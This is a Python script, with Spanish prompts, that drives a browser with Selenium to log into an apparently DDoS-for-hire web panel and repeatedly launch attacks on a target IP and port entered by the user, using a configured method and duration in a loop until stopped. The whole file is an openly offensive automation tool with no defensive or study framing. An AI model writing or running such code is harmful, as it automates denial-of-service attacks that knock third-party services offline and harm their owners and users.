from selenium import webdriver
from selenium.common.exceptions import *

import time
import traceback
from rich.console import Console
from rich.prompt import Prompt
import logging
import threading

from bot import Bot
from config import Config
from utils.presets import Presets
import utils.start




config = Config()

main_logger = logging.getLogger()
main_logger.addHandler(logging.FileHandler(config.logs["main"]))
main_logger.setLevel(logging.DEBUG)

presets = Presets(driver_type=config.driver)
service, options = presets.set("default")

console = Console()









def get_user_input():
    

    ip = console.input(f"Ingrese la dirección IP (por defecto: {config.attack['ip']}): ")
    if ip == "":
        ip = config.attack["ip"]

    port = console.input(f"Ingrese el puerto (por defecto: {config.attack['port']}): ")
    if port == "":
        port = config.attack["port"]

    return ip, port

ip, port = get_user_input()


main_logger = logging.getLogger()
main_logger.addHandler(logging.FileHandler(config.logs["main"]))
main_logger.setLevel(logging.ERROR)



thr = []
x = 0



def main():
    
    try:
        driver = webdriver.Chrome(service=service, options=options)
        bot = Bot(
            driver=driver,
            main_logger=main_logger,
            username=config.account["username"],
            password=config.account["password"]
            )

    except AttributeError as e:
        raise e


    class Loop:
        def __init__(self) -> None:
            self.count = 1
            self.running = False

        def start(self) -> any:
            if not self.running:
                self.running = True
                self.run()
            else:
                raise Exception("this loop is already running")

        def run(self) -> any:
            try:
                bot.start_attack(ip, port, config.attack["time"], config.attack["method"])
                print(f"-----------------\nejecución: {self.count}\ncuenta: {config.account['username']}\n-----------------")
                time.sleep(config.attack["time"])

            finally:
                self.count = self.count + 1

        def kill(self) -> any:
            bot.driver.quit()
            self.running = False


    try:
        bot.login_form()
        bot.DDoS_page()
        bot.close_button()
    except:
        raise Exception("error al logearse")

    time.sleep(1)

    loop = Loop()
    loop.start()
    while loop.running:
        try:
            loop.run()
        except KeyboardInterrupt:
            loop.kill()
            console.print("Esperando a que termine el ataque...", style='bold red')
            force = Prompt("forzar finalización: (Y/N)", choices=["Y", "y", "N", "n"], show_choices=False)
            if force.casefold() == "Y":
                quit(1)




main()





